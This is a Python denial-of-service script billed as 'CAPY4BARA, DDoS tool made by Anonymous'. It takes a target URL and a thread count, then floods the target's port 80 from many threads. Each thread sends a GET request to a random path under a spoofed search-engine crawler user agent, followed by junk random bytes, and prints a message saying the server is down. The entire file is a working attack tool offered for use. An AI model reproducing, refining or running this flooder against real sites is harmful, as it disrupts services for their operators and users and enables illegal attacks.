# modulos importados

import socket;
import os;
import sys;
import time;
import random;
import threading;
import string;

#limpa o terminal e coloca o ascii art

try:
    os.system('cls');
    pass
except:
    os.system('clear');
    pass


print('''
                                 .;o,
        __."iIoi,._              ;pI __-"-xx.,_
      `.3"P3PPPoie-,.            .d' `;.     `p;
     `O"dP"````""`PdEe._       .;'   .     `  `|   NACK
    "$#"'            ``"P4rdddsP'  .F.    ` `` ;  /
   i/"""     *"Sp.               .dPff.  _.,;Gw'
   ;l"'     "  `dp..            "sWf;fe|'
  `l;          .rPi .    . "" "dW;;doe;
   $          .;PE`'       " "sW;.d.d;
   $$        .$"`     `"saed;lW;.d.d.i
   .$M       ;              ``  ' ld;.p.
__ _`$o,.-__  "ei-Mu~,.__ ___ `_-dee3'o-ii~m. ____

\033[35mCAPY4BARA
\033[36mDDoS tool made by Anonymous
\033[m

''')

if len(sys.argv) == 1 or len(sys.argv) == 0:
    url = input('Insert target here:\n > ')
    threads = int(input('Insert threads number here:\n > '));
else:
    url = sys.argv[1];
    threads = int(sys.argv[2]);
    

port = 80

print('[SUCESS] Settings setted');

# gera ip
try:
    Name = url.replace("https://", "").replace("http://", "").replace("www.", "")
    host = socket.gethostbyname(Name)
    print('[SUCESS] Host IP setted');
except socket.gaierror:
    print('[ERROR] Check your URL');
    sys.exit(2)



# gera o url

def random_url():
    chars = str(string.ascii_letters + string.digits + string.punctuation);
    path = ''.join(random.sample(chars,5));
    return path

def random_agent():
    two = [
    '(iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Version/6.0 Mobile/10A525 Safari/8536.25 GoogleBot/2.1',
    '(compatible; Googlebot/2.1; http://www.google.com/bot.html)',
    '(KHTML, like Gecko; Google Web Preview Analytics) Chrome/27.0.1453 Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    '(compatible;acapbot/0.1;treat like Googlebot)',
    '(compatible; Googlebot/2.1; +http://import.io)',
    '(X11; Linux x86_64)',
    '(KHTML, like Gecko; Google Page Speed Insights) Chrome/22.0.1229 Safari/537.4 GoogleBot/2.1',
    '(KHTML, like Gecko; Google Web Preview Analytics)',
    '(compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    '(compatible; YandexBot/3.0; +http://yandex.com/bots)'
    ]
    one = [
        'Mozilla/5.0',
        'Googlebot/2.1',
        'NokiaC1-01/2.0 (06.15) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 ',
        'Apple-iPhone4C1/1001.523 (compatible;acapbot/0.1;treat like Googlebot) ',
        'OnPageBot (compatible; Googlebot 2.1; +https://bot.onpage.org/) ',
        'Googlebot (compatible; Googlebot/2.1; +http://www.google.com/bot.html) ',
        'Mozilla/5.0 (compatible; YandexWebmaster/2.0; +http://yandex.com/bots) ',
        'Mozilla/5.0 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm) ',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b '
    ]
    final = one[random.randint(0,8)] + two[random.randint(0,8)];
    return final

def packages():
    link = random_url()
    user_agent = random_agent()

    #socket
    bot = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    
    try:
        bot.connect((host,port));
        bot.send(user_agent.encode())
        bot.send(f"GET /{link} HTTP/1.1\n Host: {Name}\n\n".encode())
        bot.send(random._urandom(10)*1000)
        print(f"\033[33mAnonymous Capybara shoot >> {url}\033[m")
    except socket.error:
        print(f"\033[31mAnonymous Capybara go BRRR - Server down\033[m")


#começa o ataque
thread_grp = []
for i in range(threads):
    t1 = threading.Thread(target=packages)
    t1.start()
    thread_grp.append(t1)
    time.sleep(0.01);

for thread in thread_grp:
    thread.join()